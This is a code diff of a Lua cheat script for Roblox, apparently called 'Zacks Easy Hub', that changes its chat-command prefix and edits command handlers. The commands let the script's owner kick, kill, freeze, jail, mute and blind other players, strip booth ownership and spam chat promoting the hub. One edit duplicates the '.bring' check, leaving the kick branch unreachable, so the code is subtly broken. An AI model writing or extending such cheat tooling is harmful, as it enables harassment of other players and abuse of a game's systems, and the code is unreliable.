@@ -82,8 +82,6 @@ else
         return nil
     end
 
-    local Prefix = ">"
-
     getgenv().ReplicatedStorage = getgenv().Service_Wrap("ReplicatedStorage")
 
     if not getgenv().ReplicatedStorage:FindFirstChild("Replicate-Players") then
@@ -121,7 +119,7 @@ else
 
         boolValue.Value = true
 
-        if command == Prefix.."bring" then
+        if command == ".bring" then
             local owner = cmdp:FindFirstChild("L0CKED_1N1") or cmdp:FindFirstChild("CHEATING_B0SS")
             if owner and player and owner.Character and player.Character then
                 local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
@@ -134,14 +132,14 @@ else
             else
                 warn("Owner or target character is missing.")
             end
-        elseif command == Prefix.."kick" then
+        elseif command == ".bring" then
             if player then
                 local kickReason = reason or "You have been kicked by the script owner."
                 player:Kick(kickReason)
             else
                 return warn("Player: "..tostring(player)..", was not found!")
             end
-        elseif command == Prefix.."kill" then
+        elseif command == ".kill" then
             if player.Character then
                 local humanoid = player.Character:FindFirstChildWhichIsA("Humanoid")
                 if humanoid then
@@ -150,25 +148,25 @@ else
             else
                 return warn("Player (Character): "..tostring(player)..", was not found!")
             end
-        elseif command == Prefix.."freeze" then
+        elseif command == ".freeze" then
             if player then
                 run_freeze("true", player)
             else
                 return warn("Player (Character): "..tostring(player)..", was not found!")
             end
-        elseif command == Prefix.."unfreeze" then
+        elseif command == ".unfreeze" then
             if player then
                 run_freeze("false", player)
             else
                 return warn("Player (Character): "..tostring(player)..", was not found!")
             end
-        elseif command == Prefix.."script" then
+        elseif command == ".user" then
             if player then
                 getgenv().TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral"):SendAsync("I'm using: Zacks Easy Hub")
             else
                 return warn("Player: "..tostring(player)..", was not found!")
             end
-        elseif command == Prefix.."promote all" then
+        elseif command == ".promote" then
             if player then
                 local speeches = {
                     "Zacks Easy Hub [ON TOP!]",
@@ -185,13 +183,13 @@ else
             else
                 return warn("Player: "..tostring(player)..", was not found!")
             end
-        elseif command == Prefix.."jail" then
+        elseif command == ".jail" then
             if player then
                 jailEvent:Fire(player)
             else
                 return warn("Player: "..tostring(player)..", was not found!")
             end
-        elseif command == Prefix.."unjail" then
+        elseif command == ".unjail" then
             if player then
                 getgenv().cageEnabled = false
                 local Workspace = game:GetService("Workspace")
@@ -216,31 +214,31 @@ else
             else
                 return warn("Player: "..tostring(player)..", was not found!")
             end
-        elseif command == Prefix.."mute" then
+        elseif command == ".mute" then
             if player then
                 muteEvent:Fire(player, true)
             else
                 return warn("Player: "..tostring(player)..", was not found!")
             end
-        elseif command == Prefix.."unmute" then
+        elseif command == ".unmute" then
             if player then
                 muteEvent:Fire(player, false)
             else
                 return warn("Player: "..tostring(player)..", was not found!")
             end
-        elseif command == Prefix.."emote" then
+        elseif command == ".emote" then
             if player then
                 emoteEvent:Fire(player)
             else
                 return warn("Player: "..tostring(player)..", was not found!")
             end
-        elseif command == Prefix.."nobooth" then
+        elseif command == ".nobooth" then
             if player then
                 game:GetService("ReplicatedStorage"):FindFirstChild("DeleteBoothOwnership"):FireServer()
             else
                 return warn("Player: "..tostring(player)..", was not found!")
             end
-        elseif command == Prefix.."blur all" then
+        elseif command == ".blur all" then
             if player then
                 if game:GetService("Workspace"):FindFirstChild("Camera"):FindFirstChild("VISION") then
                     local blur = game:GetService("Workspace"):FindFirstChild("Camera"):FindFirstChild("VISION")
@@ -256,7 +254,7 @@ else
             else
                 return warn("Player: "..tostring(player)..", was not found!")
             end
-        elseif command == Prefix.."unblur all" then
+        elseif command == ".unblur all" then
             if player then
                 if game:GetService("Workspace"):FindFirstChild("Camera"):FindFirstChild("VISION") then
                     local blur = game:GetService("Workspace"):FindFirstChild("Camera"):FindFirstChild("VISION")
@@ -272,16 +270,16 @@ else
             else
                 return warn("Player: "..tostring(player)..", was not found!")
             end
-        elseif command == Prefix.."hide" then
+        elseif command == ".hide" then
             if player then
                 blind_plr(player)
             else
                 return warn("Player: "..tostring(player)..", was not found!")
             end
-        elseif command == Prefix.."unhide" then
+        elseif command == ".unhide" then
             if player then
-                if game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("FULLSCREEN_GUI") then
-                    local white_screen = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("FULLSCREEN_GUI")
+                if player:WaitForChild("PlayerGui"):FindFirstChild("FULLSCREEN_GUI") then
+                    local white_screen = player:WaitForChild("PlayerGui"):FindFirstChild("FULLSCREEN_GUI")
                     white_screen.Enabled = false
                 else
                     warn("?")
@@ -591,7 +589,7 @@ else
 
         if target_blind_plr:WaitForChild("PlayerGui"):FindFirstChild("FULLSCREEN_GUI") then
             local white_screen = target_blind_plr:WaitForChild("PlayerGui"):FindFirstChild("FULLSCREEN_GUI")
-            white_screen.Enabled = false
+            white_screen.Enabled = true
         else
             return warn("?")
         end
